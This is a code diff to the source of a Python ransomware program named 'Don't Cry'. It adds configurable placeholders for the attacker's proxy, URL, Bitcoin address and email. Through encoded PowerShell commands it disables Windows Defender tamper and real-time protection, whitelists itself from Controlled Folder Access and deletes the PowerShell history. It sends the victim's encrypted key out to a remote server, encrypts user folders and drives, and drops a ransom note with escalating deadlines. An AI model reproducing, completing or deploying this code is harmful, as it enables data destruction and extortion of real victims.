@@ -35,9 +35,12 @@ from file_crypto import encrypt_file  # type: ignore
 from Crypto.Cipher import PKCS1_OAEP
 
 # Decode the encoded URL using the dx42 function.
-YOUR_URL = dx42(b"YOUR_ENCODED_URL").decode()  # Replace with your encoded URL.
-# Encode a URL using the ex42 function from the edx42 module.
+YOUR_URL = dx42(b"[YOUR_ENCODED_URL]").decode()  # Replace with your encoded URL
+# Encode a URL using the ex42 function from the edx42 module
 # Example: encoded_url = ex42(b"https://example.com".encode())
+YOUR_PROXY = dx42(b"[YOUR_ENCODED_PROXY]").decode() # Replace with your encoded proxy
+YOUR_BITCOIN_ADDRESS = "[YOUR_BITCOIN_ADDRESS]"
+YOUR_EMAIL_ADDRESS = "[YOUR_EMAIL_ADDRESS]"
 id = ""
 
 RSA_PUBLIC_KEY = """-----BEGIN RSA PUBLIC KEY-----
@@ -311,10 +314,11 @@ def check_connection(url="http://www.google.com/", timeout=30):
 
 def block_processes():
     execute_command("powercfg /h off")
-    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBUAGEAbQBwAGUAcgBQAHIAbwB0AGUAYwB0AGkAbwBuACAAJAB0AHIAdQBlAA==")
-    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=")
-    execute_command("powershell -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
-    execute_command("powershell -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
+    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBUAGEAbQBwAGUAcgBQAHIAbwB0AGUAYwB0AGkAbwBuACAAJAB0AHIAdQBlAA==")
+    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA=")
+    execute_command(f"powershell -ExecutionPolicy Bypass -Command \"Add-MpPreference -ControlledFolderAccessAllowedApplication '{sys.executable}'\"")
+    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQBuAGEAYgBsAGUAQwBvAG4AdAByAG8AbABsAGUAZABGAG8AbABkAGUAcgBBAGMAYwBlAHMAcwAgAEQAaQBzAGEAYgBsAGUAZAA=")
+    execute_command("powershell -ExecutionPolicy Bypass -EncodedCommand UgBlAG0AbwB2AGUALQBJAHQAZQBtACAALQBQAGEAdABoACAAIgAkAGUAbgB2ADoAVQBTAEUAUgBQAFIATwBGAEkATABFAFwAQQBwAHAARABhAHQAYQBcAFIAbwBhAG0AaQBuAGcAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABQAG8AdwBlAHIAUwBoAGUAbABsAFwAUABTAFIAZQBhAGQATABpAG4AZQBcAEMAbwBuAHMAbwBsAGUASABvAHMAdABfAGgAaQBzAHQAbwByAHkALgB0AHgAdAAiACAALQBFAHIAcgBvAHIAQQBjAHQAaQBvAG4AIABTAGkAbABlAG4AdABsAHkAQwBvAG4AdABpAG4AdQBlAA==")
     blocked_processes = [
         "cmd",
         "powershell",
@@ -343,7 +347,7 @@ def start_encryption():
         mlock(key)
         mlock(key_b64)
         
-        encrypted_key = encrypt_key(key_b64.encode())
+        encrypted_key = encrypt_key(bytes(key_b64.encode()))
 
         data = {
             "username": os.getlogin(),
@@ -353,8 +357,8 @@ def start_encryption():
         }
 
         proxies = {
-            "http": "socks5h://146.190.245.171:1080",
-            "https": "socks5h://146.190.245.171:1080",
+            "http": f"socks5h://{YOUR_PROXY}",
+            "https": f"socks5h://{YOUR_PROXY}",
         }  # Replace with your proxy if needed
 
         try:
@@ -368,19 +372,19 @@ def start_encryption():
             f.write(hashlib.sha256(bytes(key)).hexdigest().encode())
 
         encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), key
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Desktop"), bytes(key)
         )
         encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), key
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Downloads"), bytes(key)
         )
         encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), key
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Documents"), bytes(key)
         )
         encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), key
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Pictures"), bytes(key)
         )
         encrypt_directory(
-            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), key
+            os.path.join(f"C:\\Users\\{getpass.getuser()}", "Videos"), bytes(key)
         )
 
         bitmask = ctypes.windll.kernel32.GetLogicalDrives()
@@ -392,7 +396,7 @@ def start_encryption():
             if disk[:2] != os.getenv("SystemDrive") and disk[:2] != os.getenv(
                 "HOMEDRIVE"
             ):
-                encrypt_directory(disk, key)
+                encrypt_directory(disk, bytes(key))
 
     finally:
         zeroize1(key)
@@ -432,32 +436,41 @@ def encrypt_directory(directory_path, key):
 
 
 def shutdown():
-    msg = f"""==================================================
-            Your files are encrypted!             
-==================================================
+    msg = f"""  _______                     __   __             ______
+ |       \                   |  \ |  \           /      \
+ | $$$$$$$\  ______   _______| $$_| $$_         |  $$$$$$\  ______   __    __ 
+ | $$  | $$ /      \ |       \\$|   $$ \        | $$   \$$ /      \ |  \  |  \
+ | $$  | $$|  $$$$$$\| $$$$$$$\  \$$$$$$        | $$      |  $$$$$$\| $$  | $$
+ | $$  | $$| $$  | $$| $$  | $$   | $$ __       | $$   __ | $$   \$$| $$  | $$
+ | $$__/ $$| $$__/ $$| $$  | $$   | $$|  \      | $$__/  \| $$      | $$__/ $$
+ | $$    $$ \$$    $$| $$  | $$    \$$  $$       \$$    $$| $$       \$$    $$
+  \$$$$$$$   \$$$$$$  \$$   \$$     \$$$$         \$$$$$$  \$$       _\$$$$$$$
+                                                                    |  \__| $$
+                                                                     \$$    $$
+                                                                      \$$$$$$
 
-Important!
-All of your important files have been encrypted by Don't Cry ransomware.
-To get them back, you need to follow the instructions below.
+Very important!
+All of your important files have been encrypted by the Don't Cry ransomware.
+To get them back, please follow the instructions below.
 
 1. Do not try to recover your files by yourself!
-- If you try to remove the encryption by yourself, your files will be permanently lost.
+- If you try to decrypt the encryption by yourself, your files will be permanently lost.
 
 2. How to restore your files?
 - You need to pay a ransom to get the decryption key.
 - The amount of the ransom is $300 in Bitcoin.
 
 3. Instructions for payment:
-- Buy Bitcoin (BTC) and send $300 to the address: [Bitcoin Address Here]
-- After the transaction is confirmed, send an email to [Email Address Here] with your id ({id}) and username.
-- Then, you will then receive a decryption key to unlock your files.
+- Buy Bitcoin (BTC) and send $300 to the address: {YOUR_BITCOIN_ADDRESS}
+- After the transaction is confirmed, send an email to {YOUR_EMAIL_ADDRESS} with your ID ({id}) and username.
+- Then, you will receive a decryption key to unlock your files.
 
 4. Warning!
-- If you don't pay within 72 hours, the price will double.
-- If you don't pay within 7 days, all your files will no longer be decryptable!!!
+- The price will double if you don't pay within 24 hours.
+- All your files will become permanently encrypted and unrecoverable if you don't pay within 3 days!!!
 
 Don't Cry, just pay =}}"""
-    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\README.txt")
+    file_path = os.path.join(f"C:\\Users\\{getpass.getuser()}", r"Desktop\README_DCRY.txt")
     with open(file_path, "w") as f:
         f.write(msg)
     startup = winshell.startup()
